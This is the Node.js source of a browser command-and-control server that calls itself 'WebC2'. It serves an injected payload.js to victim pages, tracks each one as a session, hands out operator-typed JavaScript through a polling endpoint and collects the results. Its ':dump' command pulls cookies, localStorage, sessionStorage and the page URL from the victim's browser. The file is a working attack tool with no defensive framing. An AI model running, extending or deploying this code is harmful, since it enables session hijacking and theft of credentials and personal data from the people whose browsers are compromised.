const http = require("http");
const fs = require("fs");
const process = require("process");
const readline = require("readline");

const rl = readline.createInterface(process.stdin, process.stdout);

const args = process.argv.slice(2);

const flags = [];
const opts = {};
for(let i = 0; i < args.length; i++) {
  let arg = args[i];
  if(arg.startsWith("-")) {
    switch(arg) {
      case "--help":
        flags.push("help");
        break;
      case "-p":
        if(args[i + 1]) {
          if(args[i + 1] == +args[i + 1])
            opts.port = args[++i];
          else {
            console.error("Invalid port " + args[++i] + "; must be a number");
            flags.push("error");
          }
        } else {
          console.error("Missing port after flag");
          flags.push("error");
        }
        break;
      case "-h":
      case "--host":
        if(args[i + 1]) {
          opts.host = args[++i];
        } else {
          console.error("Missing host after flag");
          flags.push("error");
        }
        break;
      default:
        console.error(`Unknown flag: ${arg}`);
        flags.push("error");
    }
  } else {
    console.error("Unknown positional argument: " + arg);
    flags.push("error");
  }
}

if(flags.includes("error")) {
  process.exit(1);
}

if(flags.includes("help")) {
  console.log(fs.readFileSync("cmdhelp.txt").toString());
  process.exit();
}


const HOST = opts.host || "localhost";
const PORT = opts.port || 3000;
const PAYLOAD_ENDPOINT = "/payload.js";
const POLL_PATH = "/poll";

let exfil_paths = [];

const payload = fs.readFileSync("payload.js").toString().replace("<HOST>", HOST).replace("<PORT>", PORT).replace("<POLL_PATH>", POLL_PATH);

let COMMAND = "";
let inq = false;
let vars = {};
let svars = [];
let inspecial = false;


let current_session = 0;
let response_timeout;

function timeout() {
  console.log("\rConnection timed out...");
  readCommand();
}

function readCommand() {
  inspecial = false;
  inq = true;
  COMMAND = "";
  rl.question("> ", response => {
    if(response.startsWith(":")) {
      let cmd = response.split(" ").filter(n=>n.length>0);
      if(cmd[0] == ":sessions") {
        console.log("Available sessions:");
        console.log(exfil_paths.map((n, i) => `Session ${i + 1}: ${n.slice(1)}`).join("\n"));
      } else if (cmd[0] == ":set_session") {
        let newSession = cmd[1];
        if(newSession != +newSession)
          console.log(`Error: Invalid session ${newSession}; must be a number`);
        else if (+newSession - 1 > exfil_paths.length || +newSession < 1)
          console.log(`Error: Invalid session ${newSession}; must be a number`);
        else {
          console.log(`Setting session to ${newSession}`)
          current_session = +newSession - 1;
        }
      } else if (cmd[0] == ":exit" || cmd[0] == ":q") {
        process.exit();
      } else if (cmd[0] == ":help") {
        console.log(fs.readFileSync("help.txt").toString());
      } else if (cmd[0] == ":dump") {
        inspecial = "dump";
        COMMAND = `JSON.stringify([localStorage, sessionStorage, document.cookie, location.href])`;
        console.log(`Dumping data... Data is stored in variable dumped!`);
        inq = false;
        response_timeout = setTimeout(timeout, 20000);
        return;
      } else if (cmd[0] == ":var") {
        if(cmd[1] in vars) {
          console.log(`Value: ${vars[cmd[1]]}`);
        } else {
          console.log(`Variable ${cmd[1]} has not been set!`);
        }
      } else if (cmd[0] == ":session_var") {
        if(cmd[1] in svars[current_session]) {
          console.log(`Value: ${svars[current_session][cmd[1]]}`);
        } else {
          console.log(`Variable ${cmd[1]} has not been set in this session!`);
        }
      } else if (cmd[0] == ":vars") {
        console.log("Global variables:");
        console.log(Object.keys(vars).map(n => `\t${n}: ${vars[n]}`).join("\n"));
        
      } else if (cmd[0] == ":session_vars") {
        console.log("Session variables:");
        console.log(Object.keys(svars[current_session]).map(n => `\t${n}: ${svars[current_session][n]}`).join("\n"));
      } else if (cmd[0] == ":add_session") {
        console.log("Adding manual session " + cmd[1]);
        exfil_paths.push('/' + cmd[1]);
        svars.push({});
      } else {
        console.log("Unknown command: " + cmd[0]);
      }
      readCommand();
    } else if(response == "") {
      readCommand();
    } else {
      COMMAND = response;
      inq = false;
      response_timeout = setTimeout(timeout, 20000);
    }
  });
}

const server = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");

  if(req.url == PAYLOAD_ENDPOINT) {
    let path = Array.from({length: 10}).fill(0).map(n => "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"[Math.floor(Math.random() * 52)]).join("");
    exfil_paths.push('/' + path); svars.push({});
    console.log(`\rSession ${exfil_paths.length} created: ${path}`);
    if(inq) process.stdout.write("> ");
    res.end(payload.replace("<PATH>", '/' + path));
  } else if(exfil_paths.includes(req.url) && req.method == "POST") {
    let data = "";
    req.on("data", chunk => {
      data += chunk;
    });
    req.on("end", () => {
      clearTimeout(response_timeout);
      if(!inspecial)
        console.log(`\rRecieved: ${data}`);
      else {
        if(inspecial == "dump") {
          try {
            const dumpedData = JSON.parse(data);
            let parsed = `Local Storage:\n${Object.keys(dumpedData[0]).map(n=>`\t${n}: ${dumpedData[0][n]}`).join("\n")}\n\nSession Storage:\n${Object.keys(dumpedData[1]).map(n=>`\t${n}: ${dumpedData[1][n]}`).join("\n")}\n\nCookie: ${dumpedData[2]}`;
            vars.dumped = parsed;
            svars[current_session].dumped = parsed;
            svars[current_session].url = dumpedData[3];
            console.log(`\rData dumped!`);
            console.log(parsed);
            console.log(`Found URL ${dumpedData[3]}; stored in session variable url!`);
          } catch (e) {
            console.log(`\rThere was an error in parsing dumped data...`);
          }
        }
        inspecial = false;
      }
      if(!inq) {
        COMMAND = "";
        readCommand();
      } else {
        process.stdout.write("> ");
      }
    });
  } else if(req.url.startsWith(POLL_PATH)) {
    if(req.url == POLL_PATH + exfil_paths[current_session])
      res.end(COMMAND);
    else
      res.end("");
  } else {
    res.end(`Cannot ${req.method} ${req.url}`);
  }
});

server.listen(PORT, () => {
  console.log(`WebC2 server open on host ${HOST} and port ${PORT}\n`);
  readCommand();
});